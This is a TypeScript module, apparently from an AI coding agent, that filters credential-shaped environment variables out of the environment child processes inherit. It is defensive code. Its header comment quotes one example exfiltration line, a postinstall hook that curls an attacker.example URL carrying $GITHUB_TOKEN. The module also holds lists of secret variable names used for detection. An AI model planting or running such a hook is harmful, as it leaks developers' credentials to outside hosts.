/**
 * Inherited-environment credentials.
 *
 * The environment manager copies the machine environment verbatim, which is
 * correct for PATH and wrong for secrets. A developer who launches Cryptoric
 * from a shell that has been used for real work has `GITHUB_TOKEN`,
 * `AWS_SECRET_ACCESS_KEY` and `NPM_TOKEN` exported in it, and every child the
 * agent spawns inherits them — including `npm install` lifecycle scripts, test
 * runners and build tools from a repository the agent was merely asked to read.
 * Those are exactly the processes that are *not* trusted: a postinstall hook
 * that curls `https://attacker.example/$GITHUB_TOKEN` needs no exploit at all,
 * only a parent that handed it the value.
 *
 * So the inherited layer is filtered, and only the inherited layer. The rule is
 * "what the OS happens to be holding is not consent": a variable the user
 * deliberately maps into the PROJECT or TASK layer is passed through untouched,
 * because that is an explicit instruction from the person who owns the secret.
 * Filtering every layer would make the escape hatch impossible; filtering none
 * would make the leak automatic.
 *
 * This is *not* a substitute for the redactor (`services/tools/redact.ts`).
 * The redactor scrubs what a tool read; this stops a credential from ever
 * reaching a process that could exfiltrate it. Different leak, different place
 * to close it.
 */

import type { EnvRecord } from '@shared/types'

/**
 * Variable-name shapes that hold credentials.
 *
 * Anchored on the `_`-separated suffix rather than the whole name: the machine
 * that owns `FOO_TOKEN` today owns `BAR_TOKEN` tomorrow, and an enumerated list
 * of provider names is a list that is wrong the moment a new provider exists.
 */
const SECRET_SUFFIXES = [
  '_TOKEN',
  '_TOKENS',
  '_SECRET',
  '_SECRETS',
  '_SECRET_KEY',
  '_PASSWORD',
  '_PASSWD',
  '_PASSPHRASE',
  '_PWD',
  '_API_KEY',
  '_APIKEY',
  '_ACCESS_KEY',
  '_ACCESS_KEY_ID',
  '_PRIVATE_KEY',
  '_SECRET_ACCESS_KEY',
  '_ENCRYPTION_KEY',
  '_SIGNING_KEY',
  '_CREDENTIAL',
  '_CREDENTIALS',
  '_BEARER',
  '_AUTH',
  '_COOKIE',
  '_SESSION_KEY'
]

/**
 * Exact names whose *shape* does not betray them.
 *
 * `PGPASSWORD` is `PG` + `PASSWORD` with no separator, so a suffix rule cannot
 * see it without also swallowing names that merely contain the word.
 */
const SECRET_UNSUFFIXED = ['PGPASSWORD', 'MYSQL_PWD', 'REDISCLI_AUTH', 'NPM_CONFIG__AUTH']

/**
 * Exact names that carry a credential without advertising it in a suffix.
 *
 * `DOCKER_AUTH_CONFIG` is a JSON document of registry logins and
 * `GOOGLE_APPLICATION_CREDENTIALS` is a path to a private key file — neither
 * ends in a word that gives it away.
 */
const SECRET_EXACT = new Set([
  'AWS_SESSION_TOKEN',
  'DOCKER_AUTH_CONFIG',
  'GOOGLE_APPLICATION_CREDENTIALS',
  'GH_TOKEN',
  'GITHUB_TOKEN',
  'GITLAB_TOKEN',
  'KUBE_TOKEN',
  'NODE_AUTH_TOKEN',
  'NPM_TOKEN',
  'VCAP_SERVICES',
  'YARN_NPM_AUTH_TOKEN'
])

/**
 * Names that match a rule above but are not secrets.
 *
 * These point at a *socket* or a *helper program*, not a credential: they
 * announce how to ask something else for a secret. Stripping them would break
 * git-over-SSH and credential prompts inside a workspace while protecting
 * nothing, so they are exempted explicitly rather than by loosening the rules.
 */
const NOT_SECRET: ReadonlySet<string> = new Set([
  'SSH_AUTH_SOCK',
  'SSH_ASKPASS',
  'GIT_ASKPASS',
  'SUDO_ASKPASS',
  'XDG_SESSION_ID',
  'XDG_SESSION_TYPE',
  'SESSION_MANAGER'
])

/**
 * Matching is case-insensitive on **every** platform, not only Windows.
 *
 * The "variables are uppercase" convention is a convention, not a guarantee:
 * `github_token` and `GitHub_Token` are read by real tools. Under-matching here
 * leaks a credential, over-matching costs a user one `CRYPTORIC_PASS_ENV`
 * entry, and the asymmetry decides which way the filter should lean.
 */
function normalize(name: string): string {
  return name.toUpperCase()
}

/**
 * A comma-separated allowlist (`CRYPTORIC_PASS_ENV`) for the case this module
 * gets wrong.
 *
 * A filter that cannot be overridden is a filter that gets disabled the first
 * time it breaks a real workflow. The override lives here, in the environment
 * the user controls, and never silently re-enables everything: it names
 * individual variables.
 */
export function parsePassEnv(value: string | undefined): string[] {
  if (!value) return []
  return value
    .split(',')
    .map((name) => name.trim())
    .filter((name) => name.length > 0)
}

/**
 * Is this variable's *value* a credential?
 *
 * @param name   Variable name as the OS spelled it.
 * @param allow  Names the user explicitly opted back in.
 */
export function isSecretEnvName(name: string, { allow = [] }: { allow?: readonly string[] } = {}): boolean {
  const upper = normalize(name)

  if (NOT_SECRET.has(upper)) return false
  for (const permitted of allow) {
    if (normalize(permitted) === upper) return false
  }
  if (SECRET_EXACT.has(upper) || SECRET_UNSUFFIXED.includes(upper)) return true

  // `AWS_SECRET_ACCESS_KEY` ends in `_ACCESS_KEY`; `AUTH_TOKEN` ends in
  // `_TOKEN`. Both are caught by the suffix list, which is the point.
  return SECRET_SUFFIXES.some((suffix) => upper.endsWith(suffix))
}

export interface StripResult {
  /** The environment with credential-shaped names removed. */
  env: EnvRecord
  /** Names that were removed, so the removal can be reported to the user. */
  dropped: string[]
}

/**
 * Remove credential-shaped variables from an inherited environment.
 *
 * Returns the surviving environment and the names that were dropped. The names
 * are returned rather than logged because a user who cannot find their
 * `NPM_TOKEN` deserves an answer, and "the agent silently removed it" is not
 * one.
 */
export function stripSecretEnv(
  env: EnvRecord,
  { allow = [] }: { allow?: readonly string[] } = {}
): StripResult {
  const out: EnvRecord = {}
  const dropped: string[] = []
  for (const [name, value] of Object.entries(env)) {
    if (isSecretEnvName(name, { allow })) {
      dropped.push(name)
      continue
    }
    out[name] = value
  }
  return { env: out, dropped }
}
